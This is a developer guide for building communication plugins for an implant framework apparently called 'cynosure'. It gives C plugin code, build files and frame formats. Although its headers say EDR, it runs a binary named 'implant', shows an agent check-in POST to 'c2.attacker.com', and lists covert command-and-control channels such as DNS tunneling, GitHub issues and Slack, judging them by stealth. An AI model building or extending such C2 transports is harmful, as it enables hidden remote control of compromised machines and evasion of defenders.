# Communication Module Implementation Guide

This guide shows how to create a new communication module (like the VPN module we just built).

---

## 1. Project Structure

```
modules/Comm/{YourTransport}/
├── main.rs              # Module discovery marker
├── Cargo.toml           # Build configuration
├── build.rs             # C compilation script
└── your_transport.c     # Implementation
```

---

## 2. The Plugin Entry Point

Every comm module MUST export this symbol:

```c
edr_status_t edr_plugin_entry(edr_plugin_manifest_t *out_manifest)
{
    memset(out_manifest, 0, sizeof(*out_manifest));

    // 1. Set ABI version (must match dispatcher)
    out_manifest->abi_version.major = EDR_INTERFACE_VERSION_MAJOR;
    out_manifest->abi_version.minor = EDR_INTERFACE_VERSION_MINOR;
    out_manifest->abi_version.patch = EDR_INTERFACE_VERSION_PATCH;

    // 2. Set identity
    strncpy(out_manifest->name, "my-transport", sizeof(out_manifest->name) - 1);
    strncpy(out_manifest->vendor, "mycompany", sizeof(out_manifest->vendor) - 1);
    out_manifest->plugin_version.major = 1;
    out_manifest->plugin_version.minor = 0;
    out_manifest->plugin_version.patch = 0;

    // 3. Declare capabilities (comm modules use EDR_CAP_COMM_TRANSPORT)
    out_manifest->capabilities = EDR_CAP_COMM_TRANSPORT;

    // 4. Set priority (lower = preferred; 0 is highest)
    out_manifest->priority = 50;

    // 5. Wire up lifecycle hooks
    out_manifest->init = my_init;
    out_manifest->shutdown = my_shutdown;

    // 6. Wire up interface getters
    out_manifest->get_comm = my_get_comm;  // REQUIRED for comm modules
    out_manifest->get_file_ops = NULL;     // Not implemented
    out_manifest->get_scan = NULL;
    // ... rest are NULL for a comm-only module

    return EDR_OK;
}
```

---

## 3. Implementing the Comm Interface

```c
// State struct to track your transport
typedef struct {
    // Your transport-specific state here
    int socket;
    edr_endpoint_t endpoint;
    edr_recv_cb_t recv_handler;
    void *recv_ctx;
} my_transport_state_t;

static my_transport_state_t g_state = {0};

// Required function 1: Connect
static edr_status_t my_connect(const edr_endpoint_t *ep,
                              edr_completion_cb_t cb, void *ctx)
{
    // 1. Store endpoint config
    memcpy(&g_state.endpoint, ep, sizeof(*ep));

    // 2. Establish your transport (TCP, VPN tunnel, DNS, etc.)
    edr_status_t st = establish_transport();

    // 3. Fire callback asynchronously
    // (Even if you do it synchronously, fire it via callback)
    cb(ctx, st, NULL);

    return st;
}

// Required function 2: Disconnect
static edr_status_t my_disconnect(edr_completion_cb_t cb, void *ctx)
{
    // 1. Gracefully close transport
    close_transport();

    // 2. Fire callback
    if (cb) cb(ctx, EDR_OK, NULL);

    return EDR_OK;
}

// Required function 3: Send
static edr_status_t my_send(const edr_message_t *msg,
                           edr_completion_cb_t cb, void *ctx)
{
    // 1. Serialize message (serialize msg->payload)
    // 2. Enqueue for delivery (or send immediately if connected)
    // 3. On successful delivery (or after retries), fire callback
    
    edr_status_t st = send_message(msg);
    cb(ctx, st, NULL);

    return st;
}

// Required function 4: Set receive handler
static edr_status_t my_set_recv_handler(edr_recv_cb_t handler, void *ctx)
{
    g_state.recv_handler = handler;
    g_state.recv_ctx = ctx;
    return EDR_OK;
}

// Required function 5: Heartbeat
static edr_status_t my_heartbeat(edr_completion_cb_t cb, void *ctx)
{
    // Send a minimal "I'm alive" message
    edr_status_t st = send_heartbeat();
    
    if (cb) cb(ctx, st, NULL);
    return st;
}

// Required function 6: Is connected
static int my_is_connected(void)
{
    return g_state.socket != INVALID_SOCKET;
}

// Wire up interface
static edr_iface_comm_t g_my_comm_iface = {
    .connect = my_connect,
    .disconnect = my_disconnect,
    .send = my_send,
    .set_recv_handler = my_set_recv_handler,
    .heartbeat = my_heartbeat,
    .is_connected = my_is_connected,
};
```

---

## 4. Lifecycle Hooks

```c
static edr_status_t my_init(const edr_plugin_services_t *services,
                            const edr_agent_identity_t *identity)
{
    // Called once when plugin is loaded
    // 1. Store dispatcher services for later use
    g_state.log = services->log;
    g_state.alloc = services->alloc;
    g_state.free = services->free;

    // 2. Initialize your transport (no network calls yet)
    g_state.socket = INVALID_SOCKET;

    // 3. Log startup
    services->log(EDR_LOG_INFO, "my-transport", 
                  "Transport initialized for agent %s", identity->agent_id);

    return EDR_OK;
}

static edr_status_t my_shutdown(void)
{
    // Called when dispatcher is shutting down
    // 1. Close network connections
    if (g_state.socket != INVALID_SOCKET) {
        close(g_state.socket);
        g_state.socket = INVALID_SOCKET;
    }

    // 2. Flush any pending messages
    flush_queue();

    // 3. Free any allocated resources
    // Use g_state.free() for memory allocated with g_state.alloc()

    return EDR_OK;
}

static const edr_iface_comm_t *my_get_comm(void)
{
    return &g_my_comm_iface;
}

static const edr_iface_file_ops_t *my_get_file_ops(void) { return NULL; }
static const edr_iface_scan_t *my_get_scan(void) { return NULL; }
// ... all others return NULL
```

---

## 5. Key Design Patterns

### A. Use Dispatcher Services for Logging

```c
// Store these in init()
edr_log_fn_t g_log;
void *(*g_alloc)(size_t);
void (*g_free)(void *);

// Use them
g_log(EDR_LOG_INFO, "my-module", "Connection established");
uint8_t *buf = g_alloc(1024);
g_free(buf);
```

### B. Asynchronous I/O with Callbacks

**WRONG:**
```c
static edr_status_t my_connect(const edr_endpoint_t *ep,
                              edr_completion_cb_t cb, void *ctx)
{
    // Blocks for 10 seconds
    int sock = blocking_connect(ep->url, ep->port, 10000);
    cb(ctx, sock >= 0 ? EDR_OK : EDR_ERR_NETWORK, NULL);
    return EDR_OK;
}
```

**RIGHT:**
```c
static edr_status_t my_connect(const edr_endpoint_t *ep,
                              edr_completion_cb_t cb, void *ctx)
{
    // Store endpoint + callback for later
    g_state.pending_ep = *ep;
    g_state.pending_cb = cb;
    g_state.pending_ctx = ctx;

    // Start non-blocking connect in background thread
    spawn_connect_thread();

    // Return immediately
    return EDR_OK;

    // Thread later fires: cb(ctx, EDR_OK or error, NULL)
}
```

### C. Message Queueing for Offline Operation

```c
typedef struct {
    edr_message_t msg;
    edr_completion_cb_t cb;
    void *ctx;
    int retry_count;
} queued_msg_t;

static queued_msg_t g_queue[256];
static int g_queue_size = 0;

static edr_status_t my_send(const edr_message_t *msg,
                           edr_completion_cb_t cb, void *ctx)
{
    // If not connected, queue it
    if (!my_is_connected()) {
        if (g_queue_size >= 256) {
            return EDR_ERR_BUSY;  // Queue full
        }
        
        queued_msg_t *q = &g_queue[g_queue_size++];
        memcpy(&q->msg, msg, sizeof(*msg));
        q->cb = cb;
        q->ctx = ctx;
        q->retry_count = 0;

        return EDR_OK;  // Will send on reconnect
    }

    // Connected: send now
    return send_to_transport(msg, cb, ctx);
}

// On reconnect:
static void flush_queue(void)
{
    for (int i = 0; i < g_queue_size; i++) {
        queued_msg_t *q = &g_queue[i];
        send_to_transport(&q->msg, q->cb, q->ctx);
    }
    g_queue_size = 0;
}
```

### D. Receiving Messages

The dispatcher registers a callback with `set_recv_handler()`. Your transport calls it when messages arrive:

```c
// Your transport receives data
void on_data_received(uint8_t *data, size_t len)
{
    // Deserialize into edr_message_t
    edr_message_t msg = {0};
    if (deserialize_message(data, len, &msg) != 0) {
        return;  // Bad format
    }

    // Fire dispatcher's receive handler
    if (g_state.recv_handler) {
        g_state.recv_handler(&msg, g_state.recv_ctx);
    }

    // Dispatcher will route msg to appropriate command handler
}
```

---

## 6. Build Configuration

### Cargo.toml
```toml
[package]
name = "cynosure_my_transport"
version = "1.0.0"
edition = "2021"

[lib]
crate-type = ["cdylib"]

[build-dependencies]
cc = "1.0"
```

### build.rs
```rust
fn main() {
    cc::Build::new()
        .file("my_transport.c")
        .include("../../../src/implant")  // EDR headers
        .compile("my_transport");
}
```

### main.rs
```rust
// Placeholder for module discovery
// The loader looks for main.rs to detect modules
```

---

## 7. Compilation & Testing

```bash
# Build module
cd modules/Comm/MyTransport/
cargo build --release --lib

# Output: target/release/libcynosure_my_transport.so (Linux)
#         target/release/cynosure_my_transport.dll (Windows)

# Copy to agent plugin directory
mkdir -p /opt/edr/plugins
cp target/release/libcynosure_my_transport.so /opt/edr/plugins/

# Run agent
./implant
# Agent will load plugin and log: "my-transport: Transport initialized for agent ..."
```

---

## 8. Transport Protocol Design

**Minimal Protocol (like VPN v1):**
```
Frame: [Magic(4)][Version(2)][Flags(2)][Len(4)][Payload(Len)]
  Magic = 0xDEADBEEF (anti-gibberish)
  Version = 1
  Flags = 0 (normal) or 0x0001 (heartbeat)
  Len = payload length
```

**Or Just Use HTTP/JSON:**
```
POST /api/agent/check-in HTTP/1.1
Host: c2.attacker.com
Content-Type: application/json

{
  "agent_id": "...",
  "messages": [
    {
      "type": 3,           // EDR_MSG_EVENT
      "seq": 12345,
      "payload": {...}
    }
  ]
}
```

**Or Compress + Encrypt:**
```
Frame: [Magic][Version][Flags][IV(16)][Tag(16)][EncryptedPayload[]]
  Encrypt: AES-256-GCM with key derived from pre-shared auth
  Compress: Before encryption with zstd
```

---

## 9. Common Pitfalls

| Pitfall | Problem | Fix |
|---------|---------|-----|
| Blocking in connect() | Hangs entire agent | Use threading or async I/O |
| Forgetting to call callback | Dispatcher waits forever | Always fire cb(), even on error |
| Using malloc/free | Memory leaks if agent enforces limits | Use g_alloc()/g_free() |
| Ignoring recv_handler | Inbound messages lost | Always call recv_handler when data arrives |
| Not handling disconnects | Stale connections | Detect broken socket, reconnect, flush queue |
| Single global socket | Only one agent can run | Use thread-local storage or separate instances |

---

## 10. Example Comm Transports to Implement

1. **DNS Tunneling**: Embed commands in DNS queries, receive via TXT records
2. **GitHub Issues**: Use GitHub API to store/retrieve messages in issue comments
3. **Slack**: Post commands to Slack channel, agent polls webhook
4. **HTTP/HTTPS**: Standard REST API (easier than VPN, less stealthy)
5. **SSH**: Tunnel C2 traffic over SSH (requires SSH server on target)
6. **QUIC**: Modern UDP-based protocol (fast, encrypted by default)
7. **CoAP**: IoT protocol (lightweight, binary, good for resource-constrained)
8. **Raw TCP**: Minimal framing (just like VPN but simpler)

---

**You now have everything needed to build custom communication modules!** 🎯
